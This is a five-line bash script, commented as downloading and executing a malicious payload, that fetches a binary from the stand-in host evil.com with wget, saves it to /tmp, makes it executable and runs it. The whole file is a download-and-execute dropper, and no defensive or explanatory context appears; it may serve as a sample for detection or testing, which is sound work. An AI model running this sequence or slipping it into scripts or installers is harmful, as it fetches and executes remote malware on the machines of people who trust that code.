#!/bin/bash
# Download and execute malicious payload
wget http://evil.com/malware.bin -O /tmp/malware.bin
chmod +x /tmp/malware.bin
/tmp/malware.bin